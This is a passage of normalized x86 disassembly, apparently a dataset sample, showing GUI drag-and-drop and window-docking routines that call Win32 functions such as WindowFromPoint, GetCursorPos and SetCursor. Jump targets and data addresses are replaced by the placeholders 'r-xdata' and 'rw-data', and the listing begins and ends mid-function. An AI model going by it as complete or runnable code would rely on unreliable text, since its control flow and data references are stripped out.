mov eax esi
call sub_404688
add esp 0x100
pop esi
pop ebx
retn
sub_43f1e0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43f2aa
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x215
jg r-xdata
sub eax 0xbd00
je r-xdata
je r-xdata
mov eax [ ebx + 0x4 ]
sub eax 0x11
je r-xdata
dec eax
je r-xdata
xor eax eax
call sub_4402ec
jmp r-xdata
sub eax 0x200
je r-xdata
mov eax [ rw-data ]
add eax 0xc
call sub_43fc74
jmp r-xdata
sub eax 0xa
je r-xdata
cmp [ ebx + 0x4 ] 0x11
jne r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_407494
lea eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
push eax
call ClientToScreen
lea eax [ ebp - 0xc ]
call sub_43fc74
jmp r-xdata
sub eax 0x2
je r-xdata
mov [ ebx + 0xc ] 0x1
xor eax eax
call sub_4402ec
jmp r-xdata
mov eax [ rw-data ]
add eax 0xc
call sub_43fc74
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov al 0x1
call sub_4402ec
jmp r-xdata
sub eax 0x3
je r-xdata
jmp r-xdata
sub_43f2af
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_461f40
call sub_403f08
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
call sub_4402ec
sub_43f308
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43f332
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43f39c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43f144
mov eax esi
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x38 ]
mov [ ebx + 0x38 ] eax
sub_43f3c8
push ebp
mov ebp esp
push ecx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x38 ]
mov si 0xffdd
call sub_4038bc
pop edi
pop esi
pop ecx
pop ebp
retn 0x4
sub_43f3f4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov ecx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x38 ]
mov si 0xffdf
call sub_4038bc
xor edx edx
sub_43f44c
push ebx
mov ebx eax
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
call sub_449f78
sub_43f46c
push ebx
mov ebx eax
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
call sub_449f60
sub_43f490
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_43f378
mov dl 0x1
mov eax [ r-xdata ]
call sub_421b38
mov esi eax
mov [ ebx + 0x40 ] esi
mov edx 0xffffff
xor eax eax
call sub_42896c
mov edx eax
mov eax esi
call sub_421cb4
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_43f4f4
push ebx
push esi
call sub_403a8c
mov ebx edx
mov esi eax
mov eax [ esi + 0x40 ]
call sub_4036c0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4036b0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
sub_43f524
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43f39c
mov eax esi
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov dl [ eax + 0x54 ]
mov [ ebx + 0x54 ] dl
mov edx [ eax + 0x58 ]
mov [ ebx + 0x58 ] edx
mov dl [ eax + 0x6c ]
mov [ ebx + 0x6c ] dl
push esi
lea esi [ eax + 0x44 ]
lea edi [ ebx + 0x44 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push esi
lea esi [ eax + 0x5c ]
lea edi [ ebx + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov edx [ eax + 0x40 ]
mov eax [ ebx + 0x40 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_43f580
push ebp
mov ebp esp
push esi
push edi
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax [ esi + 0x38 ]
mov si 0xffe5
call sub_4038bc
pop edi
pop esi
pop ebp
retn 0x4
sub_43f5a4
push ebx
push esi
mov ebx edx
mov ecx eax
mov eax ecx
cdq
xor eax edx
sub eax edx
mov esi eax
mov eax ebx
cdq
xor eax edx
sub eax edx
cmp esi eax
jge r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax ecx
pop esi
pop ebx
retn
sub_43f5c8
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax [ ebx + 0xc ]
mov edx [ esp ]
cmp eax edx
jl r-xdata
sub edx eax
mov ecx [ esp + 0x8 ]
sub ecx eax
mov eax ecx
xchg edx eax
call sub_43f5a4
mov esi eax
jmp r-xdata
cmp eax [ esp + 0x8 ]
jle r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ esp + 0x4 ]
cmp eax edx
jl r-xdata
xor esi esi
sub edx eax
mov ecx [ esp + 0xc ]
sub ecx eax
mov eax ecx
xchg edx eax
call sub_43f5a4
jmp r-xdata
cmp eax [ esp + 0xc ]
jle r-xdata
test esi esi
jne r-xdata
xor eax eax
neg eax
push eax
neg esi
push esi
lea eax [ ebx + 0x44 ]
push eax
call OffsetRect
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_43f684
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov edi ebx
cmp esi [ edi + 0x4 ]
jne r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov edx ebx
cmp esi [ edx + 0x8 ]
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push esi
call GetWindowRect
push [ edi + 0x10 ]
push [ edi + 0xc ]
lea eax [ ebp - 0x10 ]
push eax
call PtInRect
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
cmp esi [ edx ]
jne r-xdata
xor eax eax
mov [ edx + 0x14 ] 0x1
jmp r-xdata
mov [ edi + 0x8 ] esi
or eax 0xffffffff
or eax 0xffffffff
xor ecx ecx
mov [ edx + 0x8 ] ecx
jmp r-xdata
sub_43f6f0
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
add eax 0xfffffff7
call sub_43fb28
mov esi eax
mov [ ebp - 0x14 ] esi
push 0x4
push esi
call GetWindow
mov edx [ rw-data ]
mov edx [ edx ]
cmp eax [ edx + 0x30 ]
je r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_43ec78
mov esi eax
test esi esi
je r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi ebx
jmp r-xdata
jmp r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
mov esi eax
mov eax esi
call sub_448484
mov edi eax
mov [ ebp - 0x18 ] edi
cmp edi [ ebp - 0x14 ]
je r-xdata
mov esi eax
mov eax esi
call sub_448484
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov edx [ ebp + 0x8 ]
mov esi eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_448484
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call GetWindowRect
mov eax [ ebp + 0x8 ]
add eax 0xfffffff7
push eax
mov eax [ ebp + 0x8 ]
dec eax
push eax
lea ecx [ ebp - 0x3c ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov eax ebx
mov si 0xffbd
call sub_4038bc
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x9 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax - 0x5 ]
mov [ ebp - 0xc ] edx
lea eax [ ebp - 0x1c ]
push eax
push sub_43f684
call GetCurrentThreadId
push eax
call EnumThreadWindows
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov esi eax
mov eax esi
call sub_448484
mov [ ebp - 0x1c ] eax
jmp r-xdata
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
call IntersectRect
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
mov eax [ eax + 0xa0 ]
call sub_448484
cmp eax [ ebp - 0x14 ]
je r-xdata
sub_43f888
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
xor eax eax
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
call sub_448484
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_448484
push eax
call IsChild
cmp eax 0x1
sbb eax eax
inc eax
pop ebp
retn
sub_43f8cc
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov esi eax
lea edi [ ebp - 0x9 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x10 ] edx
xor eax eax
mov [ ebp - 0x18 ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x11
call GetKeyState
test ax 0x8000
setne al
mov edx [ rw-data ]
mov edx [ edx ]
xor al [ edx + 0xb4 ]
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ rw-data ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
inc ebx
xor edi edi
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_43f0e0
mov [ ebp - 0x18 ] eax
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x18 ]
call sub_43f6f0
pop ecx
test al al
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_4161a0
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
call sub_448484
push eax
call IsWindowVisible
test eax eax
je r-xdata
push ebp
call sub_43f888
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xa0 ]
cmp eax [ ebp - 0x14 ]
jne r-xdata
mov [ ebp - 0x1 ] 0x1
lea eax [ ebp - 0x9 ]
push eax
lea eax [ ebp - 0x1 ]
push eax
lea ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
mov si 0xffbd
call sub_4038bc
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_447018
dec eax
jle r-xdata
push [ ebp - 0x5 ]
push [ ebp - 0x9 ]
lea eax [ ebp - 0x28 ]
push eax
call PtInRect
test eax eax
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_43f050
sub_43fa28
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
jne r-xdata
mov edi esi
mov edx edi
mov eax [ rw-data ]
call sub_4161fc
test bl bl
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
inc eax
jne r-xdata
mov edx eax
mov eax [ rw-data ]
call sub_416090
mov edx edi
mov eax [ rw-data ]
call sub_416044
jmp r-xdata
sub_43fa88
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] ecx
xor ecx ecx
test eax eax
je r-xdata
mov eax ecx
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx ]
mov [ ebp - 0x18 ] ebx
mov ebx [ ecx + 0x4 ]
mov [ ebp - 0x14 ] ebx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0xc ] ecx
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0x10 ] ecx
cmp [ rw-data ] 0x2
sete cl
mov [ ebp - 0x8 ] cl
lea ecx [ ebp - 0x18 ]
push ecx
and edx 0x7f
push edx
push 0xb02f
push eax
call SendMessageA
mov ecx eax
sub_43fae0
push ebx
mov ebx eax
xor eax eax
test ebx ebx
je r-xdata
pop ebx
retn
mov eax [ rw-data ]
call sub_4048dc
push eax
call GlobalFindAtomA
cmp ax [ rw-data ]
jne r-xdata
mov eax ebx
call sub_43ec48
test eax eax
setne al
movzx eax [ rw-data ]
push eax
push ebx
call GetPropA
test eax eax
setne al
jmp r-xdata
sub_43fb28
push ebx
push [ eax + 0x4 ]
push [ eax ]
call WindowFromPoint
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_43fae0
test al al
jne r-xdata
push ebx
call GetParent
mov ebx eax
test ebx ebx
jne r-xdata
sub_43fb54
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
test cl cl
jne r-xdata
mov eax ebx
mov edx [ ebp + 0x8 ]
call sub_43f8cc
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
call sub_43fb28
mov [ esi ] eax
push 0x0
push ebx
mov eax [ esi ]
mov ecx [ rw-data ]
mov dl 0x5
call sub_43fa88
mov ebx eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn 0x4
mov eax ebx
call sub_448484
mov [ esi ] eax
sub_43fba4
push ebx
push esi
mov ebx eax
xor eax eax
mov edx [ rw-data ]
mov esi [ edx + 0x4 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
push esi
mov eax [ rw-data ]
add eax 0xc
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x8 ]
mov ecx [ rw-data ]
mov edx ebx
call sub_43fa88
cmp eax 0x1
sbb eax eax
inc eax
sub_43fbe0
push ebx
push esi
push edi
xor edi edi
mov eax [ rw-data ]
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x1a7 ] 0x0
je r-xdata
cmp [ esi + 0x178 ] 0x0
je r-xdata
mov eax esi
call sub_446f84
test eax eax
je r-xdata
mov eax esi
call sub_446f84
dec eax
jne r-xdata
mov eax [ rw-data ]
add eax 0xc
xor edx edx
call sub_440610
mov ebx eax
jmp r-xdata
xor edx edx
mov eax [ esi + 0x178 ]
call sub_4161a0
mov edx [ rw-data ]
cmp eax [ edx + 0x38 ]
je r-xdata
test ebx ebx
je r-xdata
cmp esi ebx
jne r-xdata
mov edx ebx
mov eax [ esi + 0x178 ]
call sub_4161fc
cmp eax 0xffffffff
je r-xdata
mov ebx [ ebx + 0x30 ]
mov edx eax
mov eax esi
call sub_446f98
mov edi eax
jmp r-xdata
sub_43fc74
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
mov cl [ eax + 0x9b ]
lea edx [ esp + 0x4 ]
mov eax edi
call sub_43fb54
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
sub eax [ edi ]
cdq
xor eax edx
sub eax edx
cmp eax [ rw-data ]
jge r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x9b ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
sub eax [ edi + 0x4 ]
cdq
xor eax edx
sub eax edx
cmp eax [ rw-data ]
jl r-xdata
cmp [ rw-data ] 0x0
setne [ esp + 0x4 ]
mov [ rw-data ] 0x2
mov [ rw-data ] 0x1
mov [ esp + 0x4 ] 0x0
jmp r-xdata
mov eax [ rw-data ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ rw-data ]
mov eax [ rw-data ]
call sub_449e34
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov edx [ edi ]
mov [ eax + 0xc ] edx
mov edx [ edi + 0x4 ]
mov [ eax + 0x10 ] edx
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov al 0x1
call sub_43fba4
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x4 ]
je r-xdata
mov eax [ edi + 0x4 ]
push eax
mov al 0x2
call sub_43fba4
mov edx eax
mov ecx [ edi ]
mov eax [ rw-data ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov esi eax
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
call sub_4418a8
mov eax [ rw-data ]
mov edx [ esp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ esp + 0xc ]
mov [ eax + 0x18 ] edx
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov eax [ rw-data ]
mov edx [ esp ]
mov [ eax + 0x8 ] edx
mov eax [ rw-data ]
mov edx [ edi ]
mov [ eax + 0xc ] edx
mov edx [ edi + 0x4 ]
mov [ eax + 0x10 ] edx
xor eax eax
call sub_43fba4
cmp [ rw-data ] 0x0
je r-xdata
movsx edx si
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45ff34
push eax
call SetCursor
cmp [ rw-data ] 0x2
jne r-xdata
test ebx ebx
je r-xdata
test ebx ebx
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_449df0
mov eax [ rw-data ]
cmp [ eax + 0x6a ] 0x0
jne r-xdata
test [ ebx + 0x51 ] 0x20
je r-xdata
call sub_43fbe0
mov ebx eax
mov eax [ rw-data ]
mov [ eax + 0x58 ] ebx
test ebx ebx
jne r-xdata
mov edx [ edi + 0x4 ]
push edx
mov ecx [ edi ]
mov eax [ rw-data ]
mov edx [ eax + 0x38 ]
xchg edx eax
mov si 0xffe7
call sub_4038bc
jmp r-xdata
mov ecx [ edi + 0x4 ]
mov edx [ edi ]
mov eax [ rw-data ]
call sub_449f1c
jmp r-xdata
mov eax [ edi + 0x4 ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ edi ]
mov eax [ rw-data ]
call sub_449e34
jmp r-xdata
mov eax [ rw-data ]
call sub_449f90
movsx edx si
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45ff34
push eax
call SetCursor
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax ebx
call sub_4418a8
lea edx [ esp + 0x8 ]
mov eax ebx
mov si 0xffd8
call sub_4038bc
mov edx [ rw-data ]
mov [ edx + 0x54 ] al
mov eax [ rw-data ]
lea edx [ eax + 0x14 ]
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov si 0xffd8
call sub_4038bc
mov edx [ rw-data ]
mov [ edx + 0x54 ] al
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ rw-data ]
lea edx [ ebx + 0x5c ]
lea eax [ ebx + 0x44 ]
mov ecx 0x10
call sub_4086c8
test al al
jne r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ rw-data ]
lea esi [ eax + 0x44 ]
lea edi [ eax + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x34 ]
sub_43ff44
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov ebx edx
mov esi eax
mov [ rw-data ] esi
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x4 ] edx
push rw-data
call GetCursorPos
mov eax [ rw-data ]
mov edx [ rw-data ]
mov [ eax + 0xc ] edx
mov edx [ rw-data ]
mov [ eax + 0x10 ] edx
call GetCursor
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_43f184
mov [ rw-data ] eax
mov [ rw-data ] edi
mov eax esi
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
test bl bl
je r-xdata
mov edx esi
lea eax [ edx + 0x44 ]
mov edi [ eax + 0x8 ]
mov ecx [ eax ]
sub edi ecx
test edi edi
jle r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x1
jmp r-xdata
xor ecx ecx
mov [ edx + 0x20 ] ecx
mov [ edx + 0x24 ] ecx
mov edi [ edx + 0xc ]
sub edi ecx
mov [ esp ] edi
fild [ esp ]
mov ecx [ eax + 0x8 ]
sub ecx [ eax ]
mov [ esp + 0x4 ] ecx
fild [ esp + 0x4 ]
fdivp st1
fstp [ edx + 0x20 ]
fwait
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ rw-data ]
mov eax [ rw-data ]
call sub_449e34
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] eax
mov ecx esi
mov edi [ ecx + 0x10 ]
sub edi edx
mov [ esp ] edi
fild [ esp ]
mov edx [ eax + 0xc ]
sub edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
fild [ esp + 0x4 ]
fdivp st1
fstp [ ecx + 0x28 ]
fwait
jmp r-xdata
mov ecx [ eax + 0xc ]
mov edx [ eax + 0x4 ]
sub ecx edx
test ecx ecx
jle r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax rw-data
call sub_43fc74
mov [ rw-data ] 0x0
jmp r-xdata
mov [ rw-data ] 0x2
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
jmp r-xdata
test bl bl
je r-xdata
sub_4400b4
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov edi eax
mov [ rw-data ] edi
xor edx edx
push ebp
push sub_440259
push [ fs : edx ]
mov [ fs : edx ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x0
cmp [ edi + 0x9b ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
mov si 0xffe3
call sub_4038bc
cmp [ rw-data ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
mov si 0xffdc
call sub_4038bc
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x38 ]
mov eax esi
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_43f490
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_43ff44
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_43f378
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x38 ]
cmp [ esi + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x44
push eax
mov eax esi
call sub_448484
push eax
call GetWindowRect
jmp r-xdata
lea ecx [ ebp - 0x20 ]
xor edx edx
xor eax eax
call sub_414b3c
lea edx [ ebp - 0x20 ]
lea ecx [ ebp - 0x18 ]
mov eax esi
call sub_44187c
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x44 ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x48 ] edx
mov eax esi
mov edx [ r-xdata ]
call sub_40384c
test al al
jne r-xdata
mov eax [ ebp - 0x8 ]
lea esi [ eax + 0x44 ]
lea edi [ eax + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x10 ]
push eax
call GetCursorPos
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x44 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x48 ] edx
jmp r-xdata
mov esi [ ebp - 0x8 ]
mov edx [ esi + 0x48 ]
mov eax [ ebp - 0x8 ]
mov edi [ eax + 0x38 ]
add edx [ edi + 0x4c ]
mov eax [ esi + 0x44 ]
add eax [ edi + 0x48 ]
lea ecx [ ebp - 0x18 ]
call sub_414b3c
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x4c ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x50 ] edx
sub_440278
push ebp
mov ebp esp
push ebx
push esi
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
setne bl
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
mov bl 0x1
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0xa0 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0xa0 ]
test eax eax
je r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x4 ]
mov ecx [ rw-data ]
mov si 0xffbe
call sub_4038bc
mov ebx eax
sub_4402ec
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x1 ] al
xor ebx ebx
mov [ ebp - 0x2 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_4405b8
push [ fs : edx ]
